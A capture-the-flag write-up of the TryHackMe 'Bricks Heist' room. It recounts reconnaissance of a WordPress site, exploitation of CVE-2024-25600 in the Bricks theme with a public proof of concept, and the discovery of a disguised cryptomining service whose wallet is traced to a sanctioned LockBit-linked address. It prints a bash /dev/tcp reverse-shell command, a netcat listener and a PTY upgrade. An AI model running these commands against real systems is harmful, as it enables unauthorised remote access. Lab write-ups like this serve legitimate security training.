# Key Findings

## WordPress Compromise and Active Cryptomining Backdoor — TryHackMe: Bricks Heist

---

# 1. Initial Reconnaissance: Network and Web Application Discovery

### 1.1. Port Scanning with Nmap

Network reconnaissance began with a full-port scan rather than a default top-1000 scan, on the reasoning that a WordPress target is likely to expose its backing database directly:

```
nmap -p- -Pn 10.49.165.111
```

The `-p-` flag scans all 65,535 TCP ports, and `-Pn` skips host discovery (treating the host as up), which avoids missing a target that filters ICMP. This full sweep confirmed the value of not relying on a default port list:

| Port | Service |
|------|---------|
| 22   | SSH     |
| 80   | HTTP    |
| 443  | HTTPS   |
| 3306 | MySQL   |

**Table 1: Identified Open Ports and Services**

The presence of port 3306 (MySQL) directly exposed to the network is itself a noteworthy finding — a database port reachable outside of `localhost` widens the attack surface considerably, even though it was not the entry point ultimately used here. Ports 80 and 443 pointed to the expected web application layer, which became the focus of enumeration.

---

### 1.2. Hostname Discovery via Client-Side Inspection

Requesting the IP directly returned only a barebones page titled "Brick by Brick!" with no further content — a strong indicator that the application logic is driven by virtual-host routing and only fully resolves under its intended hostname. Rather than guessing at hostnames, the browser's built-in **Inspector** was used to examine the page's rendered `<head>`, which contained a `dns-prefetch` resource hint pointing to `//bricks.thm`, corroborated by an RSS feed `<link>` referencing `https://bricks.thm/feed/`.

This is a common and easily-missed source of internal hostname disclosure: `dns-prefetch` and `preconnect` hints exist purely as a browser performance optimization, but they necessarily reveal any hostname the page expects the browser to resolve next — including internal-only names never intended for public DNS. Adding the mapping locally:

```
10.49.165.111    bricks.thm
```

immediately unlocked the intended WordPress-driven site (as opposed to the near-empty page served for the bare IP), confirming the application enforces host-header-based routing.

---

### 1.3. Content Discovery with Gobuster and ffuf

With a working hostname in hand, `gobuster` was used for directory enumeration over HTTPS:

```
gobuster dir -u https://bricks.thm -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -k
```

(`-k` skips TLS certificate verification, necessary for a self-signed lab certificate.)

This confirmed the standard WordPress directory skeleton (`/wp-content`, `/wp-admin`, `/wp-includes`), plus a `/phpmyadmin` path — again echoing the exposed MySQL port from the initial scan, and suggesting a database administration interface was deliberately left reachable.

A follow-up `ffuf` pass added common file extensions to catch backend scripts the first wordlist would have missed:

```
ffuf -u https://bricks.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .txt,.php,.html
```

This surfaced the remaining WordPress core files (`wp-login.php`, `wp-config.php`, `xmlrpc.php`, `readme.html`) and confirmed `robots.txt` was present but unremarkable — a stock WordPress robots file disallowing `/wp-admin/` while explicitly allowing `admin-ajax.php`, the standard WordPress convention rather than a custom hint.

The `phpmyadmin` login page was reached directly and confirmed functional, but with no valid database credentials in hand it represented a dead end at this stage rather than an immediate vector, and was deliberately not pursued via credential guessing.

---

# 2. Vulnerability Identification: WPScan and the Bricks Theme

### 2.1. Automated Fingerprinting

`WPScan` was run with an API token to enable vulnerability-database lookups against the identified WordPress core and theme versions:

```
wpscan --url https://bricks.thm --disable-tls-checks --enumerate u,vp,vt --api-token <redacted>
```

The `--enumerate u,vp,vt` flags request user enumeration, vulnerable plugins, and vulnerable themes respectively — a deliberately scoped enumeration rather than a blind full sweep, since the earlier manual review had already ruled out a custom plugin footprint.

**Key results:**

| Finding | Detail |
|---|---|
| WordPress version | 6.5 (released 2024-04-02) |
| Active theme | Bricks, version 1.9.5 (detected via `style.css`, 80% confidence) |
| Enumerated user | `administrator` |
| Core vulnerabilities | 14 identified, all patched in later WordPress point releases |
| Theme vulnerabilities | 6 identified |

**Table 2: WPScan Summary Findings**

The 14 WordPress-core issues were all fixed in versions later than the running 6.5, and none offered unauthenticated code execution on their own — of far greater consequence was a single theme-level finding: **Bricks < 1.9.6.1 — Unauthenticated Remote Code Execution**, tracked as **CVE-2024-25600**.

This is a useful illustration of prioritization during vulnerability triage: a long list of "informational" or low-severity core issues can create noise that obscures the one finding that actually matters. Distinguishing a stored-XSS advisory from an unauthenticated-RCE advisory in the same scan output is the difference between a footnote and full compromise.

---

### 2.2. Understanding CVE-2024-25600

Per Rapid7's published module description, this vulnerability arises from **improper control of code generation** in the Bricks Builder theme (CWE-94): the theme leaks a nonce value that should gate access to its internal endpoints, and an attacker who obtains that nonce can reach code paths that ultimately pass attacker-controlled input into PHP's `eval()`. In practice, this collapses into unauthenticated remote code execution — no valid WordPress account, API key, or session is required.

This class of vulnerability (a nonce-leakage bypass feeding directly into `eval()`) is a textbook example of why authorization checks and dynamic code execution are a dangerous combination: the nonce is meant to function as CSRF protection, not as an authentication boundary, yet the application effectively used it as one. Once that assumption breaks, the `eval()` call downstream has no remaining safeguard.

---

# 3. Gaining Initial Access

### 3.1. Exploit Options

Two independent routes to the same vulnerability were available:

- **Metasploit module** `exploit/multi/http/wp_bricks_builder_rce`, requiring only `RHOSTS`, `RPORT`, and `SSL` to be set, with a `php/meterpreter/reverse_tcp` payload.
- **A public Python PoC** (`CVE-2024-25600.py`, authored by K3ysTr0K3R), used here directly.

The PoC required a small amount of environment preparation — a virtual environment and several missing pip packages (`alive-progress`, `requests`, `bs4`, `rich`, `prompt_toolkit`) — a reminder that public PoCs frequently assume a fuller Python environment than a fresh Kali install actually has, and that dependency errors during exploit setup are routine rather than a sign the exploit itself is broken.

### 3.2. Exploitation

```
python3 CVE-2024-25600.py -u https://bricks.thm
```

```
[*] Checking if the target is vulnerable
[+] The target is vulnerable
[*] Initiating exploit against: https://bricks.thm
[*] Initiating interactive shell
[+] Interactive shell opened successfully
Shell> whoami
apache
Shell> pwd
/data/www/default
```

The script performed its own vulnerability confirmation before exploiting, then delivered an interactive (if HTTP-request-per-command) shell running as `apache` — the standard low-privileged web server account, confirming code execution was achieved purely through the WordPress/Bricks application layer with no other foothold required.

---

### 3.3. Upgrading to a Full Reverse Shell

The PoC's built-in shell channel — one HTTP request per command — is workable but slow and fragile for sustained post-exploitation work. It was used as a launchpad for a standard TCP reverse shell:

```bash
bash -c "sh -i >& /dev/tcp/192.168.128.15/4444 0>&1"
```

caught by a listener prepared in advance:

```bash
rlwrap nc -lvnp 4444
```

`rlwrap` wraps `nc` to provide readline-style line editing and command history on the resulting shell — a small but meaningful quality-of-life improvement once the session needs to run several commands in a row, rather than a security-relevant detail in its own right.

Once the connection landed, the shell was upgraded to a full TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This sequence — HTTP-based PoC shell → outbound bash reverse shell → PTY upgrade — is a natural progression: each step trades a limitation of the previous channel (slow, one-shot HTTP requests; then a raw unstable pipe) for a more usable one, rather than attempting to solve every limitation in a single payload.

---

# 4. Flag Capture

From the interactive `apache` shell, the target directory contained a flag file placed directly alongside the WordPress installation:

```bash
ls
```
```
650c844110baced87e1606453b93f22a.txt
index.php  wp-admin  wp-content  wp-config.php  ...
```

```bash
cat 650c844110baced87e1606453b93f22a.txt
```
```
THM{****}
```

This confirmed the primary objective was met through the CVE-2024-25600 exploit chain alone, with no further privilege escalation required to reach it.

---

# 5. Post-Exploitation Discovery: An Active Cryptomining Backdoor

### 5.1. Spotting the Anomaly

Rather than stopping at the flag, the box's running services were reviewed as a matter of habit:

```bash
systemctl | grep running
```

Most entries were unremarkable system services, but one stood out on inspection: `ubuntu.service`, whose description read **"TRYHACK3M"** — plainly not a legitimate systemd unit description, and an immediate signal of tampering rather than a genuine Ubuntu component.

```bash
systemctl status ubuntu.service
```
```
● ubuntu.service - TRYHACK3M
   Loaded: loaded (/etc/systemd/system/ubuntu.service; enabled; vendor preset: enabled)
   Active: active (running)
 Main PID: 2944 (nm-inet-dialog)
   CGroup: /system.slice/ubuntu.service
           ├─2944 /lib/NetworkManager/nm-inet-dialog
           └─2945 /lib/NetworkManager/nm-inet-dialog
```

Two details here are individually suspicious and, together, conclusive: the unit is **enabled** (meaning it survives reboots — persistence, not an accident), and its process, `nm-inet-dialog`, is located inside `/lib/NetworkManager/` — a directory a defender would normally trust by virtue of its path, exactly the kind of blending-in a persistence mechanism relies on.

This is a well-known pattern in real-world intrusions: naming a malicious binary similarly to a legitimate system component, and placing it in a directory associated with trusted software, specifically to survive a cursory `ps`/`systemctl` review. It underscores why unusual **descriptions** and **enabled-at-boot** status are often better tells than the process name or path alone.

### 5.2. Confirming the Payload

The directory also held a companion file, `inet.conf`, ostensibly a configuration file but functioning as a running log:

```bash
cat /lib/NetworkManager/inet.conf
```
```
ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c...
2024-04-08 10:46:04,743 [*] confbak: Ready!
2024-04-08 10:46:04,743 [*] Status: Mining!
2024-04-08 10:46:08,745 [*] Miner()
2024-04-08 10:46:08,745 [*] Bitcoin Miner Thread Started
```

The literal log lines ("Status: Mining!", "Bitcoin Miner Thread Started") removed any ambiguity: `nm-inet-dialog` is an active cryptocurrency-mining process, not a dormant artifact, and had clearly been running against the box's CPU for some time — a direct, quantifiable cost to whoever operates the underlying infrastructure, independent of any data-confidentiality impact.

### 5.3. Decoding the Payout Wallet

The `ID:` field is not random noise but a deliberately layered encoding scheme — hex, wrapped in base64, wrapped in base64 again:

```bash
echo '<hex>' | xxd -r -p | base64 -d | base64 -d
```

resolving to a Bitcoin address:

```
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
```

Layering multiple trivial encodings in sequence is a low-effort but genuinely effective way to defeat naive string-matching or static signature detection — a plain-text wallet address in a config file is an obvious indicator of compromise, whereas the same string nested three encodings deep will not match a simple grep or YARA rule looking for base58/bech32 address patterns.

A lookup of the decoded address on Blockonomics confirmed it was neither a placeholder nor a test value:

| Metric | Value |
|---|---|
| Total received | 15.53073303 BTC (~$1,189,310.92 USD) |
| Total sent | 15.53073303 BTC (~$1,189,310.92 USD) |
| Current balance | 0 BTC |
| Recorded transactions | 8 |

**Table 3: Payout Wallet Transaction Summary**

The wallet's balance sitting at zero despite over a million dollars in lifetime turnover indicates funds are being moved out promptly rather than accumulated — consistent with an operator regularly sweeping mining proceeds onward rather than holding them at a single address.

### 5.4. Tracing the Proceeds

One of the wallet's larger outgoing transactions (~$307,783 at the time of the transfer) was traced to a downstream address, `32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM`. A search on this address returned a direct hit on the **U.S. Department of the Treasury's Office of Foreign Assets Control (OFAC) Specially Designated Nationals (SDN) list**: a February 2024 "Cyber-related Designations" action naming an individual (aliased, among other handles, "Bassterlord") sanctioned specifically for affiliation with the **LockBit ransomware group**.

This final piece elevates the finding well beyond a generic "someone mines crypto on compromised servers" observation. It demonstrates a direct, traceable financial link between the box's illicit mining activity and a wallet address associated — per official U.S. government sanctions designation — with a known, prolific ransomware operation. Whether the mining backdoor and the ransomware affiliation trace to the same actor or represent proceeds passing through a shared laundering path, the connection is a materially significant finding for an incident response or threat intelligence write-up, and not something a purely technical process/service review would surface on its own.

---

# 6. Conclusion

This assessment progressed from external reconnaissance to full compromise via a single, well-documented WordPress theme vulnerability, and then — through routine post-exploitation hygiene rather than any further exploitation — uncovered an entirely separate, pre-existing compromise on the same host:

1. **Client-side information disclosure** — a `dns-prefetch` hint leaked the virtual host's real name.
2. **Outdated, vulnerable software** — WordPress 6.5 with the Bricks theme at v1.9.5, unpatched against CVE-2024-25600.
3. **Unauthenticated RCE** — a nonce-leakage bypass combined with unsafe `eval()` usage yielded direct code execution as `apache`.
4. **Pre-existing compromise, discovered incidentally** — a disguised, boot-persistent cryptomining service (`ubuntu.service` → `nm-inet-dialog`) was already running on the box, entirely unrelated to the exploitation path used to get in.
5. **Financial attribution** — the miner's payout wallet showed over a million dollars in historical turnover, with funds traced to an address on the U.S. Treasury's OFAC sanctions list, associated with a LockBit-affiliated actor.

### Flag
```
THM{****}
```

### Miner Indicators of Compromise

| Indicator | Value |
|---|---|
| Malicious process | `nm-inet-dialog` |
| Disguised service | `ubuntu.service` |
| Config/log file | `/lib/NetworkManager/inet.conf` |
| Payout wallet | `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa` |
| Sanctioned downstream address | `32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM` |

**Table 4: Cryptominer Indicators of Compromise**
